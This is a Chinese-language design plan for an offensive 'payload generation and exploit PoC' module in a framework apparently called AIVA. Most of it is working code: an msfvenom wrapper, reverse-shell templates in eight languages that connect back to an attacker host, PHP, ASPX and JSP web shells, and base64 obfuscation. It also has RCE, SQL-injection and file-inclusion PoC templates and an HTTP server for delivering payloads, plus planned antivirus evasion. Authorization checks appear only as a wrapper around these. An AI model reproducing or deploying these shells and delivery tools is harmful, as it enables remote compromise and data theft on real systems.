# Payload Generation & Exploit PoC Module - 完整技術整合計畫

**導航**: **[📑 返回索引](./00_INDEX.md)** | [📖 主目錄](./README.md) | [⬅️ Phishing 整合](./05_A_Social_Engineering_Technical_Integration.md) | [⬅️ Hackingtool 整合](./05_Hackingtool_Integration.md)

> **版本**: 2.0 - 實戰技術規格  
> **狀態**: 設計階段 - 等待授權控制完善後實施  
> **最後更新**: 2025年11月25日

---

## 📋 目錄

1. [技術架構設計](#1-技術架構設計)
2. [Payload 生成引擎](#2-payload-生成引擎)
3. [PoC 自動化框架](#3-poc-自動化框架)
4. [Delivery Mechanism](#4-delivery-mechanism)
5. [與 AIVA 架構整合](#5-與-aiva-架構整合)
6. [實施路線圖](#6-實施路線圖)

---

## 1. 技術架構設計

### 1.1 模組總覽

```
services/features/function_payload_generation/
├── __init__.py
├── config/
│   ├── payload_templates.yaml       # Payload 模板配置
│   ├── exploit_definitions.yaml     # Exploit 定義
│   └── obfuscation_rules.yaml       # 混淆規則
├── generators/
│   ├── msfvenom_wrapper.py          # MSFVenom 封裝
│   ├── reverse_shell_generator.py   # Reverse Shell 生成
│   ├── web_shell_generator.py       # Web Shell 生成
│   ├── macro_generator.py           # Office Macro 生成
│   └── polyglot_generator.py        # 多語言 Payload
├── obfuscators/
│   ├── base64_obfuscator.py         # Base64 編碼
│   ├── xor_encoder.py               # XOR 編碼
│   ├── polymorphic_engine.py        # 多態引擎
│   └── av_evasion.py                # AV 繞過技術
├── poc_framework/
│   ├── exploit_template.py          # Exploit 模板
│   ├── poc_generator.py             # PoC 自動生成
│   ├── vulnerability_mapper.py      # 漏洞映射
│   └── payload_injector.py          # Payload 注入器
├── delivery/
│   ├── http_server.py               # HTTP 交付
│   ├── ftp_server.py                # FTP 交付
│   ├── smb_share.py                 # SMB 共享
│   └── dns_tunneling.py             # DNS 通道
├── listeners/
│   ├── reverse_tcp_listener.py      # TCP 監聽器
│   ├── reverse_https_listener.py    # HTTPS 監聽器
│   └── dns_listener.py              # DNS 監聽器
└── worker/
    └── payload_worker.py            # RabbitMQ Worker
```

### 1.2 核心能力矩陣

| 能力類別 | 技術實現 | 支援格式 | 繞過技術 |
|---------|---------|---------|---------|
| **Reverse Shell** | Python/Bash/PowerShell/PHP | TCP/UDP/HTTP/HTTPS/DNS | Process Injection, DLL Hollowing |
| **Web Shell** | PHP/ASP/ASPX/JSP | Single-file/Multi-file | Encoding, Obfuscation |
| **Macro Payload** | VBA/Excel4.0 | .docm/.xlsm/.pptm | Anti-Sandbox, String Obfuscation |
| **Binary Payload** | EXE/DLL/ELF/Mach-O | x86/x64/ARM | PE Injection, Code Cave |
| **Exploit PoC** | Python/Ruby/C/Metasploit | Standalone/Framework | Heap Spray, ROP Chain |
| **Data Exfiltration** | HTTPS/DNS/ICMP/SMB | Encrypted/Chunked | Steganography, Protocol Mimicry |

---

## 2. Payload 生成引擎

### 2.1 MSFVenom 封裝器

```python
# services/features/function_payload_generation/generators/msfvenom_wrapper.py

from typing import Dict, List, Optional
import subprocess
import tempfile
import os
from pathlib import Path

class MSFVenomWrapper:
    """MSFVenom Payload 生成器封裝"""
    
    PAYLOAD_TYPES = {
        'windows': {
            'reverse_tcp': 'windows/meterpreter/reverse_tcp',
            'reverse_https': 'windows/meterpreter/reverse_https',
            'reverse_http': 'windows/meterpreter/reverse_http',
            'bind_tcp': 'windows/meterpreter/bind_tcp',
            'shell_reverse_tcp': 'windows/shell/reverse_tcp',
        },
        'linux': {
            'reverse_tcp': 'linux/x64/meterpreter/reverse_tcp',
            'reverse_https': 'linux/x64/meterpreter/reverse_https',
            'shell_reverse_tcp': 'linux/x64/shell/reverse_tcp',
        },
        'android': {
            'reverse_tcp': 'android/meterpreter/reverse_tcp',
            'reverse_https': 'android/meterpreter/reverse_https',
        },
        'php': {
            'reverse_tcp': 'php/meterpreter/reverse_tcp',
        },
        'python': {
            'reverse_tcp': 'python/meterpreter/reverse_tcp',
        }
    }
    
    FORMATS = {
        'windows': ['exe', 'dll', 'msi', 'ps1', 'hta', 'vba', 'raw'],
        'linux': ['elf', 'raw', 'py'],
        'android': ['apk'],
        'php': ['raw'],
        'python': ['py', 'raw']
    }
    
    def __init__(self, msfvenom_path: str = "msfvenom"):
        self.msfvenom_path = msfvenom_path
        self._verify_msfvenom()
    
    def _verify_msfvenom(self):
        """驗證 MSFVenom 可用性"""
        try:
            subprocess.run(
                [self.msfvenom_path, '--version'],
                capture_output=True,
                check=True
            )
        except (subprocess.CalledProcessError, FileNotFoundError):
            raise RuntimeError(
                f"MSFVenom not found at {self.msfvenom_path}. "
                "Please install Metasploit Framework."
            )
    
    async def generate_payload(
        self,
        platform: str,
        payload_type: str,
        lhost: str,
        lport: int,
        output_format: str,
        encoder: Optional[str] = None,
        iterations: int = 1,
        template: Optional[str] = None,
        custom_options: Dict = None
    ) -> Dict:
        """生成 Payload
        
        Args:
            platform: 'windows', 'linux', 'android', 'php', 'python'
            payload_type: 'reverse_tcp', 'reverse_https', 'bind_tcp'
            lhost: 監聽 IP
            lport: 監聽端口
            output_format: 'exe', 'dll', 'elf', 'raw', 'ps1', 'apk'
            encoder: 編碼器 (e.g., 'x86/shikata_ga_nai')
            iterations: 編碼迭代次數
            template: 模板文件路徑
            custom_options: 自訂選項
        
        Returns:
            {
                'payload_path': '/tmp/payload.exe',
                'payload_size': 73802,
                'payload_hash': 'sha256:abc123...',
                'generation_command': 'msfvenom -p ...',
                'metadata': {...}
            }
        """
        # 驗證參數
        if platform not in self.PAYLOAD_TYPES:
            raise ValueError(f"Unsupported platform: {platform}")
        
        if payload_type not in self.PAYLOAD_TYPES[platform]:
            raise ValueError(f"Unsupported payload type: {payload_type} for {platform}")
        
        if output_format not in self.FORMATS[platform]:
            raise ValueError(f"Unsupported format: {output_format} for {platform}")
        
        # 構建 msfvenom 命令
        payload_name = self.PAYLOAD_TYPES[platform][payload_type]
        
        # 創建臨時輸出文件
        output_file = tempfile.NamedTemporaryFile(
            delete=False,
            suffix=f'.{output_format}'
        )
        output_path = output_file.name
        output_file.close()
        
        cmd = [
            self.msfvenom_path,
            '-p', payload_name,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', output_format,
            '-o', output_path
        ]
        
        # 添加編碼器
        if encoder:
            cmd.extend(['-e', encoder, '-i', str(iterations)])
        
        # 添加模板
        if template:
            cmd.extend(['-x', template, '-k'])
        
        # 添加自訂選項
        if custom_options:
            for key, value in custom_options.items():
                cmd.append(f'{key}={value}')
        
        # 執行生成
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                check=True
            )
            
            # 計算文件哈希
            import hashlib
            with open(output_path, 'rb') as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
            
            # 獲取文件大小
            file_size = os.path.getsize(output_path)
            
            return {
                'payload_path': output_path,
                'payload_size': file_size,
                'payload_hash': f'sha256:{file_hash}',
                'generation_command': ' '.join(cmd),
                'metadata': {
                    'platform': platform,
                    'payload_type': payload_type,
                    'lhost': lhost,
                    'lport': lport,
                    'format': output_format,
                    'encoder': encoder,
                    'iterations': iterations,
                    'stdout': result.stdout,
                }
            }
        
        except subprocess.CalledProcessError as e:
            # 清理臨時文件
            if os.path.exists(output_path):
                os.unlink(output_path)
            
            raise RuntimeError(
                f"MSFVenom payload generation failed: {e.stderr}"
            )
    
    async def list_payloads(self, platform: Optional[str] = None) -> List[str]:
        """列出可用的 Payload"""
        if platform:
            if platform not in self.PAYLOAD_TYPES:
                raise ValueError(f"Unknown platform: {platform}")
            return list(self.PAYLOAD_TYPES[platform].keys())
        
        # 返回所有平台的 Payload
        all_payloads = []
        for plat, payloads in self.PAYLOAD_TYPES.items():
            for payload_type in payloads.keys():
                all_payloads.append(f"{plat}/{payload_type}")
        return all_payloads
    
    async def list_encoders(self) -> List[str]:
        """列出可用的編碼器"""
        result = subprocess.run(
            [self.msfvenom_path, '--list', 'encoders'],
            capture_output=True,
            text=True
        )
        
        # 解析輸出
        encoders = []
        for line in result.stdout.split('\n'):
            if '/' in line and not line.strip().startswith('#'):
                encoder = line.split()[0]
                if encoder:
                    encoders.append(encoder)
        
        return encoders
```

### 2.2 Reverse Shell 生成器

```python
# services/features/function_payload_generation/generators/reverse_shell_generator.py

class ReverseShellGenerator:
    """Reverse Shell 生成器（多語言支援）"""
    
    SHELL_TEMPLATES = {
        'bash': """
#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
""",
        'python': """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
""",
        'python_advanced': """
import socket,subprocess,os,platform,sys
from datetime import datetime

def reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # 發送系統信息
        info = {{
            'hostname': platform.node(),
            'system': platform.system(),
            'release': platform.release(),
            'machine': platform.machine(),
            'python_version': sys.version,
            'timestamp': datetime.now().isoformat()
        }}
        s.send(str(info).encode() + b'\\n')
        
        # 啟動 Shell
        while True:
            data = s.recv(1024)
            if not data:
                break
            
            if data.strip() == b'exit':
                break
            
            # 執行命令
            proc = subprocess.Popen(
                data.decode().strip(),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output + b'\\n')
        
        s.close()
    except Exception as e:
        pass

if __name__ == '__main__':
    reverse_shell("{lhost}", {lport})
""",
        'powershell': """
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
""",
        'php': """
<?php
$sock = fsockopen("{lhost}", {lport});
exec("/bin/sh -i <&3 >&3 2>&3");
?>
""",
        'php_advanced': """
<?php
set_time_limit(0);
$ip = '{lhost}';
$port = {lport};

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    die("Connection failed");
}}

// 發送系統信息
$info = array(
    'hostname' => gethostname(),
    'php_version' => phpversion(),
    'os' => PHP_OS,
    'timestamp' => date('c')
);
fwrite($sock, json_encode($info) . "\\n");

// Shell 循環
while (!feof($sock)) {{
    $cmd = fgets($sock, 1024);
    if (trim($cmd) == 'exit') break;
    
    $output = shell_exec($cmd);
    fwrite($sock, $output);
}}

fclose($sock);
?>
""",
        'ruby': """
require 'socket'
require 'open3'

s = TCPSocket.new("{lhost}", {lport})
while cmd = s.gets
    IO.popen(cmd, "r") {{|io| s.print io.read}}
end
""",
        'perl': """
use Socket;
$i="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}};
""",
        'java': """
import java.io.*;
import java.net.*;

public class ReverseShell {{
    public static void main(String[] args) throws Exception {{
        String host = "{lhost}";
        int port = {lport};
        
        Socket socket = new Socket(host, port);
        Process process = new ProcessBuilder("/bin/sh")
            .redirectErrorStream(true)
            .start();
        
        InputStream pi = process.getInputStream();
        InputStream pe = process.getErrorStream();
        InputStream si = socket.getInputStream();
        OutputStream po = process.getOutputStream();
        OutputStream so = socket.getOutputStream();
        
        while (!socket.isClosed()) {{
            while (pi.available() > 0)
                so.write(pi.read());
            while (pe.available() > 0)
                so.write(pe.read());
            while (si.available() > 0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
        }}
    }}
}}
"""
    }
    
    async def generate_reverse_shell(
        self,
        language: str,
        lhost: str,
        lport: int,
        obfuscate: bool = False,
        encode: bool = False
    ) -> Dict:
        """生成 Reverse Shell
        
        Args:
            language: 'bash', 'python', 'powershell', 'php', 'ruby', 'perl', 'java'
            lhost: 監聽 IP
            lport: 監聽端口
            obfuscate: 是否混淆
            encode: 是否編碼
        
        Returns:
            {
                'code': '...',
                'language': 'python',
                'execution_command': 'python3 shell.py',
                'encoded': '...' (if encode=True)
            }
        """
        if language not in self.SHELL_TEMPLATES:
            raise ValueError(f"Unsupported language: {language}")
        
        # 生成基礎代碼
        template = self.SHELL_TEMPLATES[language]
        code = template.format(lhost=lhost, lport=lport)
        
        # 混淆處理
        if obfuscate:
            code = await self._obfuscate_code(code, language)
        
        # 編碼處理
        encoded = None
        if encode:
            encoded = await self._encode_payload(code, language)
        
        # 生成執行命令
        exec_cmd = self._get_execution_command(language)
        
        return {
            'code': code,
            'language': language,
            'execution_command': exec_cmd,
            'encoded': encoded,
            'metadata': {
                'lhost': lhost,
                'lport': lport,
                'obfuscated': obfuscate,
                'encoded': encode
            }
        }
    
    async def _obfuscate_code(self, code: str, language: str) -> str:
        """混淆代碼"""
        if language == 'python':
            # Base64 + exec
            import base64
            encoded = base64.b64encode(code.encode()).decode()
            return f"import base64;exec(base64.b64decode('{encoded}'))"
        
        elif language == 'powershell':
            # Base64 encoding
            import base64
            encoded = base64.b64encode(code.encode('utf-16le')).decode()
            return f"powershell -enc {encoded}"
        
        elif language == 'php':
            # Base64 + eval
            import base64
            encoded = base64.b64encode(code.encode()).decode()
            return f"<?php eval(base64_decode('{encoded}')); ?>"
        
        return code
    
    async def _encode_payload(self, code: str, language: str) -> str:
        """編碼 Payload（多重編碼）"""
        import base64
        import codecs
        
        # Base64
        encoded = base64.b64encode(code.encode()).decode()
        
        # Hex
        hex_encoded = codecs.encode(code.encode(), 'hex').decode()
        
        return {
            'base64': encoded,
            'hex': hex_encoded
        }
    
    def _get_execution_command(self, language: str) -> str:
        """獲取執行命令"""
        commands = {
            'bash': 'bash shell.sh',
            'python': 'python3 shell.py',
            'python_advanced': 'python3 shell.py',
            'powershell': 'powershell -ExecutionPolicy Bypass -File shell.ps1',
            'php': 'php shell.php',
            'php_advanced': 'php shell.php',
            'ruby': 'ruby shell.rb',
            'perl': 'perl shell.pl',
            'java': 'javac ReverseShell.java && java ReverseShell'
        }
        return commands.get(language, f'{language} shell')
```

### 2.3 Web Shell 生成器

```python
# services/features/function_payload_generation/generators/web_shell_generator.py

class WebShellGenerator:
    """Web Shell 生成器"""
    
    WEB_SHELL_TEMPLATES = {
        'php_simple': """
<?php
if(isset($_REQUEST['cmd'])){{
    system($_REQUEST['cmd']);
}}
?>
""",
        'php_advanced': """
<?php
// Web Shell - Advanced
error_reporting(0);
set_time_limit(0);

function execute_command($cmd) {{
    $output = '';
    
    // 嘗試多種執行方式
    if(function_exists('system')) {{
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    }} elseif(function_exists('passthru')) {{
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    }} elseif(function_exists('shell_exec')) {{
        $output = shell_exec($cmd);
    }} elseif(function_exists('exec')) {{
        exec($cmd, $out);
        $output = implode("\\n", $out);
    }}
    
    return $output;
}}

if(isset($_POST['cmd'])) {{
    $cmd = $_POST['cmd'];
    $output = execute_command($cmd);
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
    exit;
}}
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Console</title>
    <style>
        body {{ font-family: monospace; background: #1e1e1e; color: #d4d4d4; }}
        .container {{ max-width: 800px; margin: 50px auto; }}
        textarea {{ width: 100%; padding: 10px; background: #2d2d2d; color: #d4d4d4; border: 1px solid #444; }}
        button {{ padding: 10px 20px; background: #0e639c; color: white; border: none; cursor: pointer; }}
        .output {{ background: #2d2d2d; padding: 15px; margin-top: 20px; border: 1px solid #444; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>System Console</h2>
        <form method="POST">
            <textarea name="cmd" rows="5" placeholder="Enter command..."></textarea>
            <button type="submit">Execute</button>
        </form>
        <div class="output" id="output"></div>
    </div>
</body>
</html>
""",
        'aspx': """
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {{
        if (Request["cmd"] != null) {{
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + Request["cmd"];
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            Response.Write("<pre>");
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write("</pre>");
            p.WaitForExit();
        }}
    }}
</script>
""",
        'jsp': """
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {{
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(
            new InputStreamReader(p.getInputStream())
        );
        String line;
        while ((line = br.readLine()) != null) {{
            out.println(line + "<br>");
        }}
    }}
%>
"""
    }
    
    async def generate_web_shell(
        self,
        shell_type: str,
        password: Optional[str] = None,
        obfuscate: bool = False
    ) -> Dict:
        """生成 Web Shell
        
        Args:
            shell_type: 'php_simple', 'php_advanced', 'aspx', 'jsp'
            password: 訪問密碼
            obfuscate: 是否混淆
        
        Returns:
            {
                'code': '...',
                'shell_type': 'php_advanced',
                'access_url': 'http://target/shell.php?cmd=whoami',
                'password': '...'
            }
        """
        if shell_type not in self.WEB_SHELL_TEMPLATES:
            raise ValueError(f"Unknown shell type: {shell_type}")
        
        code = self.WEB_SHELL_TEMPLATES[shell_type]
        
        # 添加密碼保護
        if password:
            code = self._add_password_protection(code, password, shell_type)
        
        # 混淆處理
        if obfuscate:
            code = await self._obfuscate_web_shell(code, shell_type)
        
        # 生成訪問 URL
        ext = self._get_extension(shell_type)
        access_url = f"http://target/shell.{ext}"
        if 'php' in shell_type:
            access_url += "?cmd=whoami"
        
        return {
            'code': code,
            'shell_type': shell_type,
            'access_url': access_url,
            'password': password,
            'extension': ext
        }
    
    def _add_password_protection(self, code: str, password: str, shell_type: str) -> str:
        """添加密碼保護"""
        if 'php' in shell_type:
            protection = f"""
<?php
$password = '{password}';
if (!isset($_REQUEST['auth']) || $_REQUEST['auth'] !== $password) {{
    die('Access Denied');
}}
?>
"""
            return protection + code
        
        return code
    
    async def _obfuscate_web_shell(self, code: str, shell_type: str) -> str:
        """混淆 Web Shell"""
        if 'php' in shell_type:
            # 變量名混淆
            import random
            import string
            
            var_names = ['cmd', 'output', 'result']
            for var in var_names:
                new_var = ''.join(random.choices(string.ascii_lowercase, k=8))
                code = code.replace(var, new_var)
        
        return code
    
    def _get_extension(self, shell_type: str) -> str:
        """獲取文件擴展名"""
        if 'php' in shell_type:
            return 'php'
        elif shell_type == 'aspx':
            return 'aspx'
        elif shell_type == 'jsp':
            return 'jsp'
        return 'txt'
```

---

## 3. PoC 自動化框架

### 3.1 Exploit 模板引擎

```python
# services/features/function_payload_generation/poc_framework/poc_generator.py

from typing import Dict, List
from dataclasses import dataclass

@dataclass
class VulnerabilityInfo:
    """漏洞信息"""
    cve_id: str
    name: str
    description: str
    affected_versions: List[str]
    exploit_type: str  # 'rce', 'sqli', 'xss', 'lfi', 'rfi', 'ssrf'
    severity: str  # 'critical', 'high', 'medium', 'low'

class PoCGenerator:
    """PoC 自動生成器"""
    
    EXPLOIT_TEMPLATES = {
        'rce': """
#!/usr/bin/env python3
# PoC for {cve_id} - {name}
# Severity: {severity}

import requests
import sys

def exploit(target_url, command):
    \"\"\"
    {description}
    
    Args:
        target_url: Target URL
        command: Command to execute
    \"\"\"
    payload = {{
        '{payload_param}': command
    }}
    
    try:
        response = requests.{method}(
            f"{{target_url}}{endpoint}",
            {data_type}=payload,
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"[+] Exploit successful!")
            print(f"[+] Output:\\n{{response.text}}")
            return True
        else:
            print(f"[-] Exploit failed. Status: {{response.status_code}}")
            return False
    
    except Exception as e:
        print(f"[-] Error: {{e}}")
        return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {{sys.argv[0]}} <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    command = "whoami"  # 修改為你想執行的命令
    
    exploit(target, command)
""",
        'sqli': """
#!/usr/bin/env python3
# PoC for {cve_id} - SQL Injection
# Severity: {severity}

import requests
import sys

def test_sqli(target_url, param_name):
    \"\"\"
    SQL Injection PoC
    \"\"\"
    # SQL Injection Payloads
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' UNION SELECT NULL--",
        "' AND 1=2 UNION SELECT username, password FROM users--"
    ]
    
    for payload in payloads:
        data = {{param_name: payload}}
        
        try:
            response = requests.post(target_url, data=data, timeout=10)
            
            # 檢測 SQL 錯誤訊息
            sql_errors = [
                'mysql', 'syntax error', 'SQL syntax',
                'postgresql', 'Warning: pg_',
                'ORA-', 'SQLite', 'ODBC'
            ]
            
            if any(error in response.text.lower() for error in sql_errors):
                print(f"[+] Potential SQL Injection found!")
                print(f"[+] Payload: {{payload}}")
                print(f"[+] Response snippet:\\n{{response.text[:200]}}")
                return True
        
        except Exception as e:
            print(f"[-] Error testing payload '{{payload}}': {{e}}")
    
    print("[-] No SQL Injection detected")
    return False

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {{sys.argv[0]}} <target_url> <param_name>")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2]
    
    test_sqli(target, param)
""",
        'lfi': """
#!/usr/bin/env python3
# PoC for {cve_id} - Local File Inclusion
# Severity: {severity}

import requests
import sys

def test_lfi(target_url, param_name):
    \"\"\"
    LFI PoC - 測試本地文件包含
    \"\"\"
    # LFI Payloads
    payloads = [
        '../../../../../etc/passwd',
        '....//....//....//....//etc/passwd',
        '/etc/passwd',
        'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts',
        '../../../../../windows/win.ini'
    ]
    
    for payload in payloads:
        params = {{param_name: payload}}
        
        try:
            response = requests.get(target_url, params=params, timeout=10)
            
            # 檢測成功標誌
            if 'root:' in response.text or '[extensions]' in response.text:
                print(f"[+] LFI Vulnerability found!")
                print(f"[+] Payload: {{payload}}")
                print(f"[+] File content:\\n{{response.text[:500]}}")
                return True
        
        except Exception as e:
            print(f"[-] Error: {{e}}")
    
    print("[-] No LFI detected")
    return False

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {{sys.argv[0]}} <target_url> <param_name>")
        sys.exit(1)
    
    test_lfi(sys.argv[1], sys.argv[2])
"""
    }
    
    async def generate_poc(
        self,
        vuln_info: VulnerabilityInfo,
        custom_params: Dict = None
    ) -> Dict:
        """生成 PoC
        
        Args:
            vuln_info: 漏洞信息
            custom_params: 自訂參數
        
        Returns:
            {
                'poc_code': '...',
                'poc_file': 'poc_CVE-2024-1234.py',
                'usage': 'python3 poc.py <target>',
                'metadata': {...}
            }
        """
        exploit_type = vuln_info.exploit_type.lower()
        
        if exploit_type not in self.EXPLOIT_TEMPLATES:
            raise ValueError(f"Unsupported exploit type: {exploit_type}")
        
        template = self.EXPLOIT_TEMPLATES[exploit_type]
        
        # 填充模板
        params = {
            'cve_id': vuln_info.cve_id,
            'name': vuln_info.name,
            'description': vuln_info.description,
            'severity': vuln_info.severity,
            'payload_param': custom_params.get('payload_param', 'cmd') if custom_params else 'cmd',
            'method': custom_params.get('method', 'post') if custom_params else 'post',
            'endpoint': custom_params.get('endpoint', '/vulnerable') if custom_params else '/vulnerable',
            'data_type': custom_params.get('data_type', 'data') if custom_params else 'data'
        }
        
        poc_code = template.format(**params)
        
        # 生成文件名
        poc_file = f"poc_{vuln_info.cve_id.replace('-', '_')}.py"
        
        return {
            'poc_code': poc_code,
            'poc_file': poc_file,
            'usage': f"python3 {poc_file} <target_url>",
            'metadata': {
                'cve_id': vuln_info.cve_id,
                'exploit_type': exploit_type,
                'severity': vuln_info.severity,
                'affected_versions': vuln_info.affected_versions
            }
        }
```

---

## 4. Delivery Mechanism

### 4.1 HTTP Payload Server

```python
# services/features/function_payload_generation/delivery/http_server.py

from aiohttp import web
import os
from pathlib import Path

class PayloadHTTPServer:
    """HTTP Payload 交付伺服器"""
    
    def __init__(self, host: str = '0.0.0.0', port: int = 8080, payload_dir: str = '/tmp/payloads'):
        self.host = host
        self.port = port
        self.payload_dir = Path(payload_dir)
        self.payload_dir.mkdir(parents=True, exist_ok=True)
        self.app = web.Application()
        self.access_log = []
        
        # 設置路由
        self.app.router.add_get('/{payload_name}', self.serve_payload)
        self.app.router.add_get('/download/{payload_id}', self.download_payload)
        self.app.router.add_get('/stats', self.get_statistics)
    
    async def serve_payload(self, request):
        """提供 Payload 下載"""
        payload_name = request.match_info['payload_name']
        payload_path = self.payload_dir / payload_name
        
        if not payload_path.exists():
            return web.Response(text='Payload not found', status=404)
        
        # 記錄訪問
        self.access_log.append({
            'timestamp': datetime.utcnow().isoformat(),
            'ip': request.remote,
            'payload': payload_name,
            'user_agent': request.headers.get('User-Agent', 'Unknown')
        })
        
        # 返回文件
        return web.FileResponse(payload_path)
    
    async def download_payload(self, request):
        """通過 ID 下載 Payload"""
        payload_id = request.match_info['payload_id']
        # 查找對應的 Payload
        # ...
        pass
    
    async def get_statistics(self, request):
        """獲取訪問統計"""
        return web.json_response({
            'total_downloads': len(self.access_log),
            'unique_ips': len(set(log['ip'] for log in self.access_log)),
            'recent_downloads': self.access_log[-10:]
        })
    
    async def start(self):
        """啟動伺服器"""
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()
        print(f"[+] Payload server started on http://{self.host}:{self.port}")
```

---

## 5. 與 AIVA 架構整合

### 5.1 授權控制集成

```python
# services/features/function_payload_generation/worker/payload_worker.py

from services.aiva_common.security import require_authorization
from services.core.aiva_core.service_backbone.authz.permission_matrix import authorize_operation

class PayloadGenerationWorker:
    """Payload Generation Worker"""
    
    @require_authorization(resource="payload_generation.msfvenom", action="execute")
    async def generate_msfvenom_payload(self, task_payload: Dict, credentials: Dict):
        """生成 MSFVenom Payload
        
        需要授權：
        - resource: payload_generation.msfvenom
        - action: execute
        - risk_level: L3 (Critical Risk)
        """
        # L3 風險檢查
        if not authorize_operation(
            operation_name="msfvenom_payload_generation",
            risk_level="L3",
            tags=["payload_generation", "weaponization"],
            environment=os.getenv("AIVA_ENVIRONMENT", "development")
        ):
            raise PermissionError(
                "MSFVenom payload generation requires L3 authorization. "
                "This operation is restricted to controlled pentest environments."
            )
        
        # 生成 Payload
        generator = MSFVenomWrapper()
        result = await generator.generate_payload(
            platform=task_payload['platform'],
            payload_type=task_payload['payload_type'],
            lhost=task_payload['lhost'],
            lport=task_payload['lport'],
            output_format=task_payload['format']
        )
        
        # 審計日誌
        await self._audit_log.log_security_event({
            'event_type': 'PAYLOAD_GENERATED',
            'payload_type': task_payload['payload_type'],
            'platform': task_payload['platform'],
            'user': credentials.get('subject'),
            'timestamp': datetime.utcnow(),
            'payload_hash': result['payload_hash']
        })
        
        return result
```

### 5.2 Capability Registry

```yaml
# services/integration/capability/capability_registry.yaml

capabilities:
  payload_generation:
    msfvenom_wrapper:
      service: function_payload_generation
      wrapper: services.features.function_payload_generation.generators.msfvenom_wrapper.MSFVenomWrapper
      priority: 90
      tags: [payload_generation, weaponization, msfvenom]
      risk_level: L3
      authorization_required: true
      allowed_environments: [development, controlled_pentest]
      
    reverse_shell_generator:
      service: function_payload_generation
      wrapper: services.features.function_payload_generation.generators.reverse_shell_generator.ReverseShellGenerator
      priority: 85
      tags: [payload_generation, reverse_shell]
      risk_level: L2
      authorization_required: true
      
    web_shell_generator:
      service: function_payload_generation
      wrapper: services.features.function_payload_generation.generators.web_shell_generator.WebShellGenerator
      priority: 80
      tags: [payload_generation, web_shell]
      risk_level: L2
      authorization_required: true
      
    poc_generator:
      service: function_payload_generation
      wrapper: services.features.function_payload_generation.poc_framework.poc_generator.PoCGenerator
      priority: 75
      tags: [poc, vulnerability_validation]
      risk_level: L1
      authorization_required: true
```

---

## 6. 實施路線圖

### Phase 1: 基礎 Payload 生成 (Week 1-2)

```yaml
Week 1:
  Day 1-2: MSFVenomWrapper
    - 命令構建邏輯
    - 錯誤處理
    - 文件哈希計算
  
  Day 3-4: ReverseShellGenerator
    - 8種語言模板
    - 混淆功能
    - 編碼功能
  
  Day 5: WebShellGenerator
    - PHP/ASPX/JSP 模板
    - 密碼保護

Week 2:
  Day 1-2: PoCGenerator
    - RCE/SQLi/LFI 模板
    - 動態參數填充
  
  Day 3-4: 整合測試
    - Payload 生成測試
    - 哈希驗證
  
  Day 5: 授權控制
    - L2/L3 風險等級
    - Capability Registry
```

### Phase 2: Delivery & Listeners (Week 3)

```yaml
Week 3:
  Day 1-2: PayloadHTTPServer
    - 文件交付
    - 訪問追蹤
  
  Day 3-4: ReverseTCPListener
    - Socket 監聽
    - Session 管理
  
  Day 5: DNS Tunneling (進階)
```

### Phase 3: 混淆與繞過 (Week 4-5)

```yaml
Week 4-5:
  - 多態引擎
  - AV 繞過技術
  - Process Injection
  - 加密 Payload
```

---

## 7. 技術規格總結

### 7.1 支援的 Payload 類型

| 類型 | 平台 | 格式 | 風險等級 |
|-----|------|------|---------|
| Reverse Shell | Windows/Linux/macOS | EXE/ELF/Mach-O/Script | L2-L3 |
| Web Shell | PHP/ASP/JSP | Script | L2 |
| Office Macro | Windows | VBA | L3 |
